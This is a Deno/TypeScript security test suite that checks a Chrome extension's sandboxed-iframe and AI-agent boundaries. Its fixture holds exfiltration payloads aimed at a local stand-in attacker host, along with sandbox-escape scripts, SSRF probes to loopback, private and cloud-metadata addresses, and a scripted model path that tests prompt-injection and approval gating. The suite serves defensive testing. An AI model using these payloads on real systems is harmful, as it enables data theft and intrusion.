// security-suite.ts — the repeatable sandbox-boundary security check (Paul's
// "are we breaking out of the sandboxes" gate). Drives the REAL double-iframe
// (renderHtmlFrame) in headless Chrome and proves three boundaries hold:
//
//   1. NETWORK EXFIL — untrusted HTML in the sandboxed frame that attempts
//      remote loads (img / fetch / sendBeacon / WebSocket) cannot reach an
//      attacker host (zero requests escape; the injected CSP blocks them).
//   2. SANDBOX ESCAPE — untrusted HTML that tries to read parent.document,
//      navigate top, reach window.opener, or access chrome.* cannot influence
//      the extension surface (the frame is an opaque origin).
//   3. PROMPT-INJECTION → DESTRUCTIVE — the sandboxed frame has no chrome.*
//      API, so page-controlled HTML cannot invoke a destructive extension tool.
//
// and, since CAP-FB-20260830-SUITE-HONESTY-01, four boundaries of the LOADED
// EXTENSION itself (the suite used to report 7/7 without ever loading it):
//
//   4. SENDER-DERIVED AUTHORITY — a page-world script has no chrome.runtime at
//      all, and the extension's own content-script world may only reach the
//      page-allowed routes: a call to any other route is refused by the
//      service worker from the browser-attested sender, never from the body.
//   5. cap:fetch SSRF — a sandboxed script's fetch to loopback / RFC1918 /
//      link-local (cloud metadata) / localhost is refused before any request
//      leaves the browser (the attacker host sees nothing).
//   6. script.run GATING — a non-owner principal cannot run a script directly,
//      and a MODEL-initiated run_script (driven through the real provider path
//      by the scripted provider) pauses on the in-context approval card with
//      the script un-run until the owner decides.
//   7. COOKIE REDACTION — list_cookies never carries a `value` field.
//
// The escape frame reports its observations to the parent via postMessage (the
// one channel that works from an opaque frame); the parent records them into
// window.__securityResults, which the CDP probe reads. The production surface
// only ACTS on validated messages (see the preference-percolation design), so
// an untrusted frame's postMessage is observation, never action.
//
//   npm run test:security        (the supervisor holds the serialized-Chrome lock)

import { inspectExactProfile, verifyRunnerGuard } from "./security-suite-custody.mjs";
import { launchChrome, openCdp, type CdpClient } from "./lib/chrome-launch.ts";
import { SCRIPTED_DUMMY_KEY, executeEnvelope, selectionRefOf, startScriptedProvider } from "./lib/scripted-provider.ts";

const ROOT = new URL("..", import.meta.url).pathname;
const EXT = `${ROOT}extension`;

// Refuse before servers, profiles, or Chromium unless the supervisor-issued
// nonce/parent guard and inherited canonical flock open-file description are live.
const serializationError = await verifyRunnerGuard({ env: Deno.env.toObject() });
if (serializationError) {
  console.error(`SECURITY-SUITE REFUSED: ${serializationError}. Run via npm run test:security only.`);
  Deno.exit(2);
}

// The supervisor is the sole profile owner and cleanup authority.
const providedProfile = Deno.env.get("CAP_SECURITY_PROFILE") ?? "";
const profileCheck = await inspectExactProfile({ profile: providedProfile });
if (!profileCheck.ok) {
  console.error(`SECURITY-SUITE REFUSED: ${profileCheck.reason}.`);
  Deno.exit(2);
}

let pass = 0;
let fail = 0;
function check(name: string, cond: boolean, detail?: unknown) {
  if (cond) { pass++; console.log(`PASS: ${name}`); }
  else { fail++; console.log(`FAIL: ${name} — ${JSON.stringify(detail)}`); }
}
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

// ── the attacker host (port B): counts every request it receives. If a frame
//    can exfiltrate over the network, these counters move.
let attackerRequests = 0;
const attackerPaths: string[] = [];
function attackerServer(): Promise<{ url: string; port: number; requests: () => number; paths: () => string[]; close: () => Promise<void> }> {
  return new Promise((resolve) => {
    const ac = new AbortController();
    const server = Deno.serve({ port: 0, hostname: "127.0.0.1", signal: ac.signal, onListen: ({ port }) => {
      resolve({
        url: `http://127.0.0.1:${port}`,
        port,
        requests: () => attackerRequests,
        paths: () => attackerPaths,
        close: async () => { ac.abort(); await server.shutdown(); },
      });
    } }, (req) => {
      attackerRequests++;
      try { attackerPaths.push(new URL(req.url).pathname); } catch { attackerPaths.push(String(req.url)); }
      return new Response("leaked", { headers: { "access-control-allow-origin": "*" } });
    });
  });
}

// ── the docs server (port A): serves the design-system source + an inline
//    security fixture page that renders the malicious frames via renderHtmlFrame.
function docsServer(fixture: string): Promise<{ url: string; close: () => Promise<void> }> {
  return new Promise((resolve) => {
    const ac = new AbortController();
    const server = Deno.serve({ port: 0, hostname: "127.0.0.1", signal: ac.signal, onListen: ({ port }) => {
      resolve({
        url: `http://127.0.0.1:${port}`,
        close: async () => { ac.abort(); await server.shutdown(); },
      });
    } }, async (req) => {
      const url = new URL(req.url);
      const path = decodeURIComponent(url.pathname);
      if (path === "/security-fixture") {
        return new Response(fixture, { headers: { "content-type": "text/html; charset=utf-8" } });
      }
      let p = path;
      if (p === "/") p = "/components.html";
      try {
        const body = await Deno.readFile(`${ROOT}docs${p}`);
        const type = p.endsWith(".js") ? "text/javascript"
          : p.endsWith(".css") ? "text/css"
          : p.endsWith(".html") ? "text/html"
          : "application/octet-stream";
        return new Response(body, { headers: { "content-type": `${type}; charset=utf-8` } });
      } catch {
        return new Response("not found", { status: 404 });
      }
    });
  });
}

// The fixture imports the REAL components.js + renders two untrusted frames via
// renderHtmlFrame. The escape frame reports via postMessage; the parent records
// into window.__securityResults (a plain array of {origin, result}).
const fixtureHtml = `<!doctype html><html><head><meta charset="utf-8"><title>security fixture</title></head>
<body>
<div id="frames"></div>
<script>
window.__securityResults = [];
window.addEventListener("message", (e) => {
  if (e.data && e.data.type === "cap:security-escape") {
    window.__securityResults.push({ origin: e.origin, result: e.data.result });
  }
});
</script>
<script type="module">
import { renderHtmlFrame } from "/components.js";
const host = "__ATTACKER_URL__";
const frames = {
  exfil: [
    '<img src="' + host + '/leak-img?d=secret">',
    '<script>fetch("' + host + '/leak-fetch").catch(()=>{}); navigator.sendBeacon("' + host + '/leak-beacon"); try{new WebSocket("ws://127.0.0.1:9/leak-ws");}catch(e){}<\\/script>',
  ].join(""),
  // CRITICAL regression probes (sol): the pre-head load + self-navigation +
  // meta-refresh escapes. Each must be BLOCKED (no request reaches the attacker).
  'prehead': [
    // An <img> BEFORE any <head> — must not load (the CSP is prepended first).
    '<img src="' + host + '/pre-csp-image">',
    '<head><title>x</title></head>',
  ].join(""),
  'selfnav': [
    // Self-navigation. The in-frame navigation guard blocks window.open + link/
    // form navigation (the location object is unforgeable, so location.href is
    // closed by the extension-level declarativeNetRequest rule — verified in the
    // extension journeys). Here we verify the guard's window.open block.
    '<script>try{var w=window.open("' + host + '/self-window-open");}catch(e){}<\\/script>',
  ].join(""),
  'metarefresh': [
    // A meta-refresh navigation — must be stripped (never reaches the attacker).
    '<meta http-equiv="refresh" content="0;url=' + host + '/meta-refresh">',
  ].join(""),
  escape: [
    '<script>',
    'var r = {};',
    'try { r.parentRead = parent.document.title; } catch(e) { r.parentRead = "blocked:" + e.name; }',
    'try { top.location.href = "' + host + '/navigated"; r.topNav = "attempted"; } catch(e) { r.topNav = "blocked:" + e.name; }',
    'r.opener = (window.opener === null) ? "null" : "present";',
    'r.chromeType = typeof chrome;',
    'r.chromeRuntime = (typeof chrome === "object" && chrome && chrome.runtime) ? "present" : "absent";',
    'parent.postMessage({ type: "cap:security-escape", result: r }, "*");',
    '<\\/script>',
  ].join(""),
};
for (const k of Object.keys(frames)) {
  const d = document.createElement("div");
  d.innerHTML = renderHtmlFrame(frames[k]);
  document.getElementById("frames").appendChild(d);
}
</script>
</body></html>`;

/** `chrome.runtime.sendMessage` from an extension page context. */
async function sendFrom(cdp: CdpClient, session: string, payload: unknown): Promise<any> {
  return await cdp.eval(
    session,
    `chrome.runtime.sendMessage(${JSON.stringify(payload)}).then(v => ({ v }), e => ({ err: String(e && e.message || e) }))`,
  ).then((r) => (r && typeof r === "object" && "v" in r) ? r.v : r);
}

/** A genuine CDP click on an element (coordinates discovered, input real). */
async function clickAt(cdp: CdpClient, session: string, expr: string): Promise<boolean> {
  const b = await cdp.eval(session, expr).catch(() => null);
  if (!b || typeof b.x !== "number") return false;
  await cdp.send("Input.dispatchMouseEvent", { type: "mousePressed", x: b.x, y: b.y, button: "left", buttons: 1, clickCount: 1 }, session);
  await cdp.send("Input.dispatchMouseEvent", { type: "mouseReleased", x: b.x, y: b.y, button: "left", buttons: 0, clickCount: 1 }, session);
  return true;
}
const centerOf = (selector: string) =>
  `(() => { const el = document.querySelector(${JSON.stringify(selector)}); if (!el) return null; el.scrollIntoView({ block: "center", inline: "center" }); const r = el.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 }; })()`;

async function main() {
  const attacker = await attackerServer();
  const fixture = fixtureHtml.replaceAll("__ATTACKER_URL__", attacker.url);
  const docs = await docsServer(fixture);
  // The scripted provider: the model's side of the run_script journey (check 6).
  let scriptIdForModel = "";
  const provider = await startScriptedProvider({
    steps: [
      { tool: "search_tools", args: { query: "run_script", limit: 1 } },
      { tool: "execute_tool", args: (req) => ({ selectionRef: selectionRefOf(req), arguments: { origin: "master", id: scriptIdForModel } }) },
      { text: "The script run was decided by the owner." },
      { text: "The script run was decided by the owner." }, // the reply to agent-do's nudge turn
    ],
  });

  // ONE browser, launched through the shared launcher WITH the extension: the
  // renderHtmlFrame fixture and the extension checks share it (the supervisor
  // issues exactly one profile).
  // The cookie-redaction probe (check 7) needs the cookies capability granted
  // so list_cookies EXECUTES. Seed it into the fresh profile's Preferences
  // before launch (the established headless-honest pattern — Chrome never
  // shows optional-permission prompts headless, and a second in-flight
  // permission card in a run is the m6id defect; neither is a dependency a
  // security gate may take).
  const chrome = await launchChrome({ extension: EXT, profile: providedProfile, windowSize: "1440,900", timeoutMs: 20000, grantPermissions: ["cookies"] });
  console.log(`security-suite: launched ${chrome.wsUrl.replace(/\/devtools\/browser\/.*/, "/devtools/browser/…")} with --load-extension=${EXT}`);
  const cdp = await openCdp(chrome.wsUrl);

  try {
    // ── 1-3: the renderHtmlFrame boundaries on the fixture page ──────────
    const fx = await cdp.open(`${docs.url}/security-fixture`);
    await sleep(3500);

    const n = attacker.requests();
    check("network exfil: no request escaped the sandbox", n === 0, { attackerRequests: n, paths: attacker.paths() });

    const results = await cdp.eval(fx.sessionId, `window.__securityResults ?? []`);
    const escape = (results ?? []).find((x: any) => x?.result?.parentRead !== undefined)?.result ?? null;
    check("sandbox escape: parent.document is blocked", String(escape?.parentRead ?? "").startsWith("blocked"), escape);
    check("sandbox escape: top navigation is blocked", String(escape?.topNav ?? "").startsWith("blocked"), escape);
    check("sandbox escape: window.opener is null", escape?.opener === "null", escape);
    check("prompt-injection: no chrome.runtime (extension API) in the sandbox", escape?.chromeRuntime === "absent", escape);

    const path = await cdp.eval(fx.sessionId, `location.pathname`);
    check("sandbox escape: the outer page did not navigate away", String(path).includes("security-fixture"), path);

    await sleep(1500);
    const n2 = attacker.requests();
    check("network exfil: still zero after settle", n2 === 0, { attackerRequests: n2 });

    // ── the loaded extension ─────────────────────────────────────────────
    const sw = await cdp.serviceWorker({ timeoutMs: 20000 });
    check("extension: the service worker target registered (--load-extension)", !!sw, { url: sw?.url ?? null, tail: chrome.stderrTail().slice(-300) });
    if (!sw) throw new Error("the extension did not load; the remaining checks cannot run");
    const extId = new URL(sw.url).host;
    console.log(`security-suite: service worker target ${sw.url}`);

    // 4. SENDER-DERIVED AUTHORITY. The fixture page is a plain http page: its
    //    MAIN world has no chrome.runtime at all (nothing is externally
    //    connectable), and the extension's own ISOLATED content-script world —
    //    the only page-side principal that can message the worker — is
    //    confined to the page-allowed routes by the browser-attested sender.
    const contexts: any[] = [];
    const off = cdp.on("Runtime.executionContextCreated", (p, sid) => { if (sid === fx.sessionId) contexts.push(p?.context); });
    // Re-enable to have every existing context re-announced on this session.
    await cdp.send("Runtime.disable", {}, fx.sessionId).catch(() => {});
    await cdp.send("Runtime.enable", {}, fx.sessionId);
    await sleep(300);
    off();
    const mainRuntime = await cdp.eval(fx.sessionId, `typeof chrome === "object" && chrome && typeof chrome.runtime`);
    check("sender authority: a page's MAIN world has no chrome.runtime", mainRuntime === "undefined" || mainRuntime === false, { mainRuntime });
    const isolated = contexts.find((c) => c?.auxData?.type === "isolated");
    const inWorld = async (expr: string) => {
      const r = await cdp.send("Runtime.evaluate", { expression: expr, contextId: isolated.id, returnByValue: true, awaitPromise: true }, fx.sessionId);
      return r?.result?.result?.value;
    };
    let refusedRoute: any = null, allowedRoute: any = null;
    if (isolated) {
      refusedRoute = await inWorld(`chrome.runtime.sendMessage({ type: "agent.list" }).then(v => v, e => ({ thrown: String(e && e.message || e) }))`).catch((e) => ({ evalError: String(e?.message ?? e) }));
      allowedRoute = await inWorld(`chrome.runtime.sendMessage({ type: "tools.list" }).then(v => v, e => ({ thrown: String(e && e.message || e) }))`).catch((e) => ({ evalError: String(e?.message ?? e) }));
    }
    check(
      "sender authority: the content-script world is refused on a non-page route (agent.list)",
      !!isolated && refusedRoute?.ok === false && /not authorized from a page/.test(String(refusedRoute?.error ?? "")),
      { isolated: !!isolated, refusedRoute, contexts: contexts.map((c) => ({ name: c?.name, type: c?.auxData?.type })) },
    );
    check(
      "sender authority: the same world still reaches a page-allowed route (tools.list) — the refusal is the route, not a dead channel",
      !!isolated && allowedRoute && typeof allowedRoute === "object" && !("thrown" in allowedRoute) && !("evalError" in allowedRoute) && allowedRoute.error !== "not authorized from a page",
      { allowedRoute },
    );

    // Open Settings (the owner principal) and the hub (the run surface).
    const opts = await cdp.open(`chrome-extension://${extId}/options/options.html`);
    await sleep(1500);
    const ntp = await cdp.open(`chrome-extension://${extId}/ntp/ntp.html`);
    await sleep(2000);

    // 5. cap:fetch SSRF — four private targets, each refused before any request.
    const targets = [
      ["loopback 127.0.0.1", `${attacker.url}/?d=leak`],
      ["RFC1918 10.0.0.1", "http://10.0.0.1/?d=leak"],
      ["link-local 169.254.169.254 (cloud metadata)", "http://169.254.169.254/latest/meta-data/?d=leak"],
      ["localhost", `http://localhost:${attacker.port}/?d=leak`],
    ];
    const attackerBefore = attacker.requests();
    const createdScripts: string[] = [];
    for (const [label, url] of targets) {
      const created = await sendFrom(cdp, opts.sessionId, { type: "script.create", origin: "master", name: `ssrf probe ${label}`, source: `return (await fetch(${JSON.stringify(url)})).status` });
      const id = created?.script?.id ?? "";
      if (id) createdScripts.push(id);
      const run = id ? await sendFrom(cdp, opts.sessionId, { type: "script.run", origin: "master", id }) : created;
      check(
        `cap:fetch: ${label} is refused from a sandboxed script`,
        run?.ok === false && /private or loopback address/.test(String(run?.error ?? "")),
        { created: created?.ok, run },
      );
    }
    check("cap:fetch: the attacker host saw no request from the four probes", attacker.requests() === attackerBefore, { before: attackerBefore, after: attacker.requests(), paths: attacker.paths() });

    // 6. script.run GATING. An owner's own click in an extension UI document
    //    is owner-direct by design (the Settings probes above ran directly), and
    //    a page cannot reach the route at all (check 4). The boundary that
    //    matters is the MODEL principal: a model-initiated run_script, through
    //    the REAL provider path (the scripted provider answers search_tools →
    //    execute_tool(run_script)), must pause on the in-context approval card
    //    with the source visible and the script un-run until the owner decides.
    const gated = await sendFrom(cdp, opts.sessionId, { type: "script.create", origin: "master", name: "gate probe", source: `const url = "https://example.com/";\nreturn url.length;` });
    scriptIdForModel = gated?.script?.id ?? "";
    if (scriptIdForModel) createdScripts.push(scriptIdForModel);
    const setProvider = await sendFrom(cdp, opts.sessionId, { type: "provider.set", config: { provider: "openai-compatible", baseURL: provider.baseURL, apiKey: SCRIPTED_DUMMY_KEY, model: "scripted" } });
    await cdp.send("Target.activateTarget", { targetId: ntp.targetId }).catch(() => {});
    await cdp.send("Page.bringToFront", {}, ntp.sessionId).catch(() => {});
    let composer = false;
    for (let i = 0; i < 20 && !composer; i++) {
      composer = await clickAt(cdp, ntp.sessionId, centerOf("#task-input"));
      if (!composer) await sleep(250);
    }
    if (composer) {
      // Genuine key events (the composer enables Run on real input).
      for (const ch of "run the gate probe script") {
        await cdp.send("Input.dispatchKeyEvent", { type: "char", text: ch, unmodifiedText: ch }, ntp.sessionId);
      }
      await clickAt(cdp, ntp.sessionId, centerOf("#run-task"));
    }
    const readCard = () => cdp.eval(
      ntp.sessionId,
      `(() => { const card = document.querySelector("approval-card"); if (!card) return null; const root = card.shadowRoot; return { state: card.getAttribute("state") || "pending", title: root?.querySelector(".title")?.textContent ?? "", source: root?.querySelector(".source")?.textContent ?? null, hasApprove: !!root?.querySelector(".approve") }; })()`,
    ).catch(() => null);
    let card: any = null;
    for (let i = 0; i < 60 && !card?.hasApprove; i++) {
      card = await readCard();
      if (!card?.hasApprove) await sleep(500);
    }
    const beforeDecision = await sendFrom(cdp, opts.sessionId, { type: "script.get", origin: "master", id: scriptIdForModel });
    const threadText = card?.hasApprove ? "" : await cdp.eval(ntp.sessionId, `(() => { const out = []; const walk = (n) => { if (n.nodeType === 3) { out.push(n.data); return; } if (n.nodeType !== 1 && n.nodeType !== 11) return; if (n.nodeType === 1 && (n.tagName === 'SCRIPT' || n.tagName === 'STYLE')) return; if (n.shadowRoot) walk(n.shadowRoot); for (const c of n.childNodes) walk(c); }; walk(document.getElementById('thread-conversation') ?? document.body); return out.join(' ').replace(/\\s+/g, ' ').slice(0, 600); })()`).catch(() => "");
    check(
      "script.run: a model-initiated run_script (real provider path) pauses on the approval card with the source shown and the script un-run",
      setProvider?.ok !== false && composer && card?.hasApprove === true && card?.title === "Run this script now?" &&
        typeof card?.source === "string" && card.source.includes("example.com") && beforeDecision?.script?.lastRunAt == null,
      { setProvider: setProvider?.provider, composer, card, lastRunAt: beforeDecision?.script?.lastRunAt ?? null, providerRequests: provider.requests.map((r) => ({ tools: r.toolNames.length, msgs: r.messages.length, stream: r.stream })), overflow: provider.overflow, threadText },
    );
    // Evidence: the card as the owner sees it, kept beside the supervisor's
    // guard record (the run's own evidence directory).
    try {
      const shot = await cdp.send("Page.captureScreenshot", { format: "png" }, ntp.sessionId);
      const b64 = shot?.result?.data;
      const guard = Deno.env.get("CAP_SECURITY_GUARD") ?? "";
      if (b64 && guard) {
        const dir = guard.slice(0, guard.lastIndexOf("/"));
        await Deno.writeFile(`${dir}/security-suite-approval-card.png`, Uint8Array.from(atob(b64), (c) => c.charCodeAt(0)));
        console.log(`security-suite: evidence ${dir}/security-suite-approval-card.png`);
      }
    } catch { /* evidence only */ }
    // Decide "Not now" with a genuine click so the run settles before teardown.
    await clickAt(cdp, ntp.sessionId, `(() => { const b = document.querySelector("approval-card")?.shadowRoot?.querySelector(".deny, .not-now, button:not(.approve)"); if (!b) return null; b.scrollIntoView({ block: "center" }); const r = b.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 }; })()`);
    await sleep(1500);

    // 7. COOKIE REDACTION — list_cookies output never carries a value.
    // Driven through a GENUINE run: a fresh scripted provider plays the
    // model, the composer opens a real foreground run (the runTask model
    // path), and the run's live context carries the call (never the background
    // agent-worker.tool Worker RPC route def.4 fences). The cookies capability
    // is seeded into the fresh profile before launch (the headless-honest
    // stand-in for Chrome's optional-permission prompt, which never renders
    // headless) — no card appears, the tool EXECUTES, and the assertion
    // requires the real executed envelope (ok, a cookies array,
    // valuesRedacted: true) plus the run's durable terminal record, never a
    // vacuous pass on an expired/absent one.
    const cookieProvider = await startScriptedProvider({
      steps: [
        { tool: "search_tools", args: { query: "list_cookies", limit: 1 } },
        { tool: "execute_tool", args: (req: any) => ({ selectionRef: selectionRefOf(req), arguments: { domain: "127.0.0.1" } }) },
        { text: "Listed." },
      ],
    });
    let cookiesEnv: any = null;
    let cookieModelContent = "";
    try {
      await sendFrom(cdp, opts.sessionId, { type: "provider.set", config: { provider: "openai-compatible", baseURL: cookieProvider.baseURL, apiKey: SCRIPTED_DUMMY_KEY, model: "scripted" } });
      await cdp.send("Target.activateTarget", { targetId: ntp.targetId }).catch(() => {});
      await cdp.send("Page.bringToFront", {}, ntp.sessionId).catch(() => {});
      // Snapshot the known durable executions BEFORE the click: the terminal
      // wait below must bind to THIS run's exact execution (provider request
      // arrival proves the transcript reached the model, not that the run
      // consumed the final response or settled).
      const cookieRunsBefore = new Set((((await sendFrom(cdp, opts.sessionId, { type: "run.list" }).catch(() => null))?.runs ?? []).map((r: any) => r?.executionId).filter(Boolean)));
      let cookieComposer = false;
      // Start a NEW task from the hub home view (check 6 left its thread open;
      // typing there would continue it). Genuine clicks + real input events.
      await cdp.eval(ntp.sessionId, `document.querySelector("#home")?.click(); "home"`).catch(() => null);
      await sleep(700);
      for (let i = 0; i < 20 && !cookieComposer; i++) {
        cookieComposer = await clickAt(cdp, ntp.sessionId, centerOf("#task-input"));
        if (!cookieComposer) await sleep(250);
      }
      let cookieRunClicked = false;
      if (cookieComposer) {
        for (const ch of "list the cookies for 127.0.0.1") {
          await cdp.send("Input.dispatchKeyEvent", { type: "char", text: ch, unmodifiedText: ch }, ntp.sessionId);
        }
        await sleep(300);
        cookieRunClicked = await clickAt(cdp, ntp.sessionId, `(() => { const b = document.querySelector("#run-task"); if (!b || b.disabled) return null; const r = b.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 }; })()`);
      }
      // The cookies capability was seeded into the profile before launch —
      // assert the grant is live, then the run's list_cookies executes with no
      // card at all. A pending/expired/absent envelope must FAIL the check
      // below, never pass vacuously (the 86oj round-1 false-green).
      const cookiesGranted = await cdp.eval(opts.sessionId, `chrome.permissions.contains({ permissions: ["cookies"] }).then(v => v, () => "err")`).catch(() => "err");
      for (let i = 0; i < 120 && cookieProvider.requests.length < 3; i++) await sleep(500);
      // Then await the EXACT run's durable terminal record before any
      // close/restore — the run must have consumed the provider's final
      // answer and settled (terminal.ok), not merely produced requests.
      let cookieRunRecord: any = null;
      const t0 = Date.now();
      while (Date.now() - t0 < 120000) {
        const runs = await sendFrom(cdp, opts.sessionId, { type: "run.list" }).catch(() => null);
        const rows = runs?.runs ?? [];
        if (!cookieRunRecord) {
          cookieRunRecord = rows.find((r: any) => r?.executionId && !cookieRunsBefore.has(r.executionId) && typeof r?.taskPreview === "string" && r.taskPreview.includes("list the cookies for 127.0.0.1".slice(0, 32))) ?? null;
        }
        if (cookieRunRecord) {
          cookieRunRecord = rows.find((r: any) => r?.executionId === cookieRunRecord.executionId) ?? cookieRunRecord;
          if (cookieRunRecord.phase === "terminal" || cookieRunRecord.phase === "cancelled") break;
        }
        await sleep(500);
      }
      const lastCookieReq = cookieProvider.requests[cookieProvider.requests.length - 1];
      cookiesEnv = lastCookieReq ? executeEnvelope(lastCookieReq, "list_cookies") : null;
      cookieModelContent = JSON.stringify((lastCookieReq?.messages ?? []).filter((m: any) => m?.role === "tool").map((m: any) => m.content));
      check("cookies: the redaction probe run executed list_cookies for real (capability granted, envelope settled, run terminal)",
        cookiesGranted === true && cookieComposer === true && cookieRunClicked === true && cookieProvider.requests.length === 3 && cookieProvider.overflow === 0 &&
          cookieRunRecord?.phase === "terminal" && cookieRunRecord?.terminal?.ok === true &&
          cookiesEnv?.ok === true && Array.isArray(cookiesEnv?.result?.cookies) && cookiesEnv?.result?.valuesRedacted === true,
        { granted: cookiesGranted, composer: cookieComposer, runClicked: cookieRunClicked, requests: cookieProvider.requests.length, overflow: cookieProvider.overflow, runPhase: cookieRunRecord?.phase ?? null, terminalOk: cookieRunRecord?.terminal?.ok ?? null, env: JSON.stringify(cookiesEnv)?.slice(0, 300) });
    } finally {
      await cookieProvider.close();
      await sendFrom(cdp, opts.sessionId, { type: "provider.set", config: { provider: "demo", apiKey: "" } }).catch(() => {});
    }
    check(
      "cookies: list_cookies returns no value field (metadata only) — in the model's own context",
      cookiesEnv?.ok === true && !/"value"/.test(cookieModelContent),
      { env: JSON.stringify(cookiesEnv)?.slice(0, 300) },
    );

    for (const id of createdScripts) await sendFrom(cdp, opts.sessionId, { type: "script.delete", origin: "master", id }).catch(() => {});
    await sendFrom(cdp, opts.sessionId, { type: "provider.set", config: { provider: "demo", apiKey: "" } }).catch(() => {});
  } catch (e) {
    check("suite: ran to completion", false, String((e as Error)?.message ?? e));
  } finally {
    cdp.close();
    try { chrome.proc.kill("SIGKILL"); } catch { /* already dead */ }
    try { await chrome.proc.status; } catch { /* reaped */ }
    await provider.close();
    await attacker.close();
    await docs.close();
  }

  console.log(`\nRESULT: ${pass} passed, ${fail} failed`);
  Deno.exit(fail === 0 ? 0 : 1);
}

await main();
